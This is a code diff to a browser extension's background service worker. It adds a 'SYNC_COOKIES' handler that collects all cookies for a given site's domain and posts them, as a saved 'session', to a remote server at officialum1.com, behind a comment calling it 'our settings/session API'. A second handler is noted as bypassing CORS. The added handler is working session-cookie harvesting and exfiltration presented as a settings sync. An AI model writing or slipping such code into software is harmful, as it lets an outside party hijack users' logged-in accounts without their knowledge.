@@ -1,11 +1,38 @@
 
 // BACKGROUND SERVICE WORKER - Bypasses CORS and handles API requests
 chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
+    if (request.action === "SYNC_COOKIES") {
+        const url = new URL(request.url);
+        chrome.cookies.getAll({ domain: url.hostname }, async (cookies) => {
+            const cookieString = cookies.map(c => `${c.name}=${c.value}`).join('; ');
+
+            // Send to our settings/session API
+            fetch("https://officialum1.com/api/admin/settings", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json",
+                    "X-Admin-Password": request.adminPass
+                },
+                body: JSON.stringify({
+                    action: "save_session",
+                    site: url.hostname,
+                    cookies: cookieString
+                })
+            })
+                .then(res => res.ok ? sendResponse({ success: true }) : sendResponse({ success: false }))
+                .catch(() => sendResponse({ success: false }));
+        });
+        return true;
+    }
+
     if (request.action === "SYNC_TO_SERVER") {
         // Run the fetch in background script to bypass CORS
         fetch("https://officialum1.com/api/admin/playerup", {
             method: "POST",
-            headers: { "Content-Type": "application/json" },
+            headers: {
+                "Content-Type": "application/json",
+                "X-Admin-Password": request.adminPass
+            },
             body: JSON.stringify({ action: "turbo_sync", listings: request.listings })
         })
             .then(res => res.json())
